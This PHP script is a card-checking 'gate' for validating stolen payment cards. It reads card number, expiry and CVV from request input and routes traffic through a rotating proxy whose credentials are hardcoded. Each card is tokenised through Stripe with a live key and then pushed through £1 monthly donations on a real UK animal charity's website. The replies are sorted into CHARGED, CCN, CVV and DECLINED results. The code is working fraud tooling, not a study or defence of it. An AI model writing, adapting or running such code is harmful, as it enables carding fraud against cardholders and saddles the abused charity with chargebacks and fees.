<?php



require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


$last4 = substr($cc, -4);


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//

#------[Username Generator]------#


function usernameGen($firstName)
{
    $randomNumbers = rand(100, 999); // Generate a random 3-digit number
    $username = $firstName . $randomNumbers;
    return $username;
}

$firstNames = [
    "John", "Alice", "Bob", "Catherine", "David", "Emily", "Frank", "Grace", "Henry", "Isabella",
    "Jack", "Kate", "Liam", "Mia", "Noah", "Olivia", "Peter", "Quinn", "Ryan", "Sophia",
    "Thomas", "Ursula", "Victor", "Wendy", "Xavier", "Yvonne", "Zachary", "Amelia", "Benjamin", "Chloe"
];

$randomIndex = array_rand($firstNames);
$firstName = $firstNames[$randomIndex];

$un = usernameGen($firstName);




#------[Password Generator]------#


function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();




#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);

$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1, 3);
$numero2 = substr($phone, 6, 3);
$numero3 = substr($phone, 10, 4);
$num = $numero1 . '' . $numero2 . '' . $numero3;

$serve_arr = array("gmail.com", "homtail.com", "yahoo.com.br", "outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];

$email = ""; // Initialize the $email variable here with a suitable value

$email = str_replace("example.com", $serv_rnd, $email);
$state = strtolower($state);

if ($state == "alabama") {
    $state = "AL";
} elseif ($state == "alaska") {
    $state = "AK";
} elseif ($state == "arizona") {
    $state = "AZ";
} elseif ($state == "arkansas") {
    $state = "AR";
} elseif ($state == "california") {
    $state = "CA";
} elseif ($state == "colorado") {
    $state = "CO";
} elseif ($state == "connecticut") {
    $state = "CT";
} elseif ($state == "delaware") {
    $state = "DE";
} elseif ($state == "district of columbia") {
    $state = "DC";
} elseif ($state == "florida") {
    $state = "FL";
} elseif ($state == "georgia") {
    $state = "GA";
} elseif ($state == "hawaii") {
    $state = "HI";
} elseif ($state == "idaho") {
    $state = "ID";
} elseif ($state == "illinois") {
    $state = "IL";
} elseif ($state == "indiana") {
    $state = "IN";
} elseif ($state == "iowa") {
    $state = "IA";
} elseif ($state == "kansas") {
    $state = "KS";
} elseif ($state == "kentucky") {
    $state = "KY";
} elseif ($state == "louisiana") {
    $state = "LA";
} elseif ($state == "maine") {
    $state = "ME";
} elseif ($state == "maryland") {
    $state = "MD";
} elseif ($state == "massachusetts") {
    $state = "MA";
} elseif ($state == "michigan") {
    $state = "MI";
} elseif ($state == "minnesota") {
    $state = "MN";
} elseif ($state == "mississippi") {
    $state = "MS";
} elseif ($state == "missouri") {
    $state = "MO";
} elseif ($state == "montana") {
    $state = "MT";
} elseif ($state == "nebraska") {
    $state = "NE";
} elseif ($state == "nevada") {
    $state = "NV";
} elseif ($state == "new hampshire") {
    $state = "NH";
} elseif ($state == "new jersey") {
    $state = "NJ";
} elseif ($state == "new mexico") {
    $state = "NM";
} elseif ($state == "new york") {
    $state = "NY";
} elseif ($state == "north carolina") {
    $state = "NC";
} elseif ($state == "north dakota") {
    $state = "ND";
} elseif ($state == "ohio") {
    $state = "OH";
} elseif ($state == "oklahoma") {
    $state = "OK";
} elseif ($state == "oregon") {
    $state = "OR";
} elseif ($state == "pennsylvania") {
    $state = "PA";
} elseif ($state == "rhode island") {
    $state = "RI";
} elseif ($state == "south carolina") {
    $state = "SC";
} elseif ($state == "south dakota") {
    $state = "SD";
} elseif ($state == "tennessee") {
    $state = "TN";
} elseif ($state == "texas") {
    $state = "TX";
} elseif ($state == "utah") {
    $state = "UT";
} elseif ($state == "vermont") {
    $state = "VT";
} elseif ($state == "virginia") {
    $state = "VA";
} elseif ($state == "washington") {
    $state = "WA";
} elseif ($state == "west virginia") {
    $state = "WV";
} elseif ($state == "wisconsin") {
    $state = "WI";
} elseif ($state == "wyoming") {
    $state = "WY";
} else {
    $state = "KY";
}

//==============[Randomizing Details-END]======================//


//==================[BIN LOOK-UP]======================//


$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);


//==================[BIN LOOK-UP-END]======================//

$curl = curl_init('http://ipv4.webshare.io/');
curl_setopt($curl, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'qobuhuzk-rotate:w8zjn678ts5v');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // Store response in a variable
$response = curl_exec($curl);

if ($response === false) {
    $error = curl_error($curl);
    // Handle the error appropriately
} else {
    // Process the response and determine the value of $ip1

    if (isset($ip1)) {
        $ip = "🟢";
    } else {
        $ip = "✅";
    }

    echo '[ IP: '.$response.' ] ';

//==================[BIN LOOK-UP-END]======================//



//=======================[1 REQ]==================================//


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /v1/tokens h2';
$headers[] = 'Host: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'x-requested-with: com.xbrowser.play';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'accept-language: en-IN,en-US;q=0.9,en;q=0.8';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=Badboychk&card[address_line1]=&card[address_line2]=&card[address_city]=&card[address_state]=&card[address_zip]=90023&card[address_country]=&card[currency]=GBP&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5fafadf87b%3B+stripe-js-v3%2F5fafadf87b%3B+card-element&time_on_page=155000&key=pk_live_5193XqeD14dPCfWLWVQrRyGgM46qnaXFNUrnRj3NnGLmF3Tnq9hj0WJrZUbbo6hdnsmI9QzZHRBpGdWM8Mdw690dX00WQ60V9DJ&pasted_fields=number');

////curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
////curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);

$earror = trim(strip_tags(getStr($result1,'"message": "','"')));
$ip = trim(strip_tags(getStr($result1,'"client_ip": "','"')));
$cr = trim(strip_tags(getStr($result1,'"created": "','"')));
$ip = trim(strip_tags(getStr($result1,'"id": "','"')));
$id1 = trim(strip_tags(getStr($result1,'"id": "card','"')));
$last = trim(strip_tags(getStr($result1,'"last4": "','"')));

//=======================[1 REQ-END]==============================//
//   $headers[] = 

//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.rspcaleicester.org.uk/monthly-donation/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /monthly-donation/ HTTP/1.1';
$headers[] = 'Host: www.rspcaleicester.org.uk';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Origin: https://www.rspcaleicester.org.uk';
$headers[] = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBuZne62ZG5pPKQeR';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML; like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'X-Requested-With: com.xbrowser.play';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: https://www.rspcaleicester.org.uk/monthly-donation/';
$headers[] = 'Accept-Language: en-IN,en-US;q=0.9,en;q=0.8';
$headers[] = 'Cookie: cookielawinfo-checkbox-necessary=yes; _gid=GA1.3.1925141245.1690771174; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; _ga_81C6MLEPSN=GS1.1.1690771166.1.1.1690771197.0.0.0; _ga_82GF6P5EET=GS1.1.1690771171.1.1.1690771200.31.0.0; _ga=GA1.3.842082517.1690771167';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_3"

Enter My Own Amount
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_4"

£ 1.00
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_8.1"

Your Monthly Donation
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_8.2"

£ 1.00
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_8.3"

1
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_1"

Badboy
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_2"

bad34889@gmail.com
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_5.1"

637 street
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_5.3"

California 
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_5.4"


------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_5.5"

90023
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_5.6"

United Kingdom
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_12.5"

Badboychk
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_9"

1
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_10.1"

Yes
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="input_11.1"

Email
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="is_submit_3"

1
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="gform_submit"

3
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="gform_unique_id"


------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="state_3"

WyJbXSIsImY4NDcyMTJjMGI1M2I4NjI1MzczOTZkNjIyNGVkMmNiIl0=
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="gform_target_page_number_3"

0
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="gform_source_page_number_3"

1
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="version_hash"

4aae743ab1aa0cddfbafceef03549086
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="stripe_response"

{"token":{"id":"'.$id.'","object":"token","card":{"id":"card'.$id1.'","object":"card","address_city":"","address_country":"","address_line1":"","address_line1_check":null,"address_line2":"","address_state":"","address_zip":"90023","address_zip_check":"unchecked","brand":"Visa","country":"US","currency":"gbp","cvc_check":"unchecked","dynamic_last4":null,"exp_month":'.$mes.',"exp_year":'.$ano.',"funding":"credit","last4":"'.$last.'","name":"Badboychk","tokenization_method":null,"wallet":null},"client_ip":"'.$ip.'","created":'.$cr.',"livemode":true,"type":"card","used":false}}
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="stripe_credit_card_last_four"

1704
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="stripe_credit_card_type"

Visa
------WebKitFormBoundaryBuZne62ZG5pPKQeR
Content-Disposition: form-data; name="version_hash"

4aae743ab1aa0cddfbafceef03549086
------WebKitFormBoundaryBuZne62ZG5pPKQeR--');

/////curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
//////curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');


$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
$info = curl_getinfo($ch);
$time = $info['total_time'];

# - [CVV Responses ] - #

if ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "Payment Completed."))){
  echo '<br>CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Completed. Charged $1 ✅     [ Stripe $1 ] [ Free Gates ]</span><br>';
}
elseif ((strpos($result2, 'security code is incorrect.')) || (strpos($result2, "security code is invalid.")) || (strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc"))){
    echo '<br>CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your cards security code is incorrect. ✅     [ Stripe $1 ] [ Free Gates ]</span><br>';
}
elseif ((strpos($result2, "Your card has insufficient funds.")) || (strpos($result2, '"cvc_check": "fail"'))){
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card has insufficient funds. ✅     [ Stripe $1 ] [ Free Gates ]</span><br>';
}
elseif(strpos($result2, "Error updating default payment method. Your card does not support this type of purchase." )) {
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card does not supports this type of purchase. ✅    [ Stripe $1 ] [ Free Gates ]</span><br>';
}
  elseif(strpos($result2, "Your card does not support this type of purchase." )) {
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card does not supports this type of purchase. ✅     [ Stripe $1 ] [ Free Gates ]</span><br>';
}  
  elseif(strpos($result2, "Your card was declined." )) {
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: DECLINED ❌ - Your card was declined.     [ Stripe $1 ] [ Free Gates ]</span><br>';
}  
elseif(strpos($result2, "Your card's security code is invalid." )) {
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Live ✅     [ Stripe $1 ] [ Free Gates ]</span><br>';
}
elseif(strpos($result1, "Your card number is incorrect." )) {
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT.     [ Stripe $1 ] [ Free Gates ]</span><br>';
}
else {
    echo '<br>CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result: '.$earror.'  - '.$msg.'     [ Stripe $1 ] [ Free Gates ]</span><br>';
}

curl_close($ch);
ob_flush();

echo "<b>1REQ Result:</b> $result1<br><br>";
echo "<b>2REQ Result:</b> $result2<br><br>";
echo "<b>ID tok Result:</b> $id<br><br>";
echo "<b>ID card Result:</b> $id1<br><br>";
}
?>